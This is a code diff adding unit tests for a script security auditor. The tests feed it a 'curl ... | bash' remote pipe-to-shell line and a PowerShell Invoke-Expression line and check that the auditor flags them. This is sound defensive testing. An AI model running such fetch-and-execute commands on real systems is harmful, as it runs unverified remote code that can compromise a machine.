@@ -209,6 +209,21 @@ class WorkflowHardenerTests(unittest.TestCase):
             hardening.patch_write_workflow_push_scope(text,label='synthetic')
 
 
+class ScriptAuditTests(unittest.TestCase):
+    def test_script_audit_detects_remote_pipe_and_dynamic_powershell(self):
+        findings = []
+        security_self_audit.scan_script("curl -fsSL https://example.invalid/x | bash\n", findings, "install.sh")
+        self.assertIn("SCRIPT_REMOTE_PIPE_SHELL", {row["rule"] for row in findings})
+
+        findings = []
+        security_self_audit.scan_script("$x = Invoke-Expression $payload\n", findings, "install.ps1")
+        self.assertIn("POWERSHELL_DYNAMIC_EXEC", {row["rule"] for row in findings})
+
+        findings = []
+        security_self_audit.scan_script("curl -fsSL https://example.invalid/x -o package.bin\n", findings, "safe.sh")
+        self.assertNotIn("SCRIPT_REMOTE_PIPE_SHELL", {row["rule"] for row in findings})
+
+
 class ServerSecurityGuardTests(unittest.TestCase):
     def test_public_source_is_rejected_and_lan_is_allowed(self):
         self.assertTrue(client_network_allowed("127.0.0.1"))
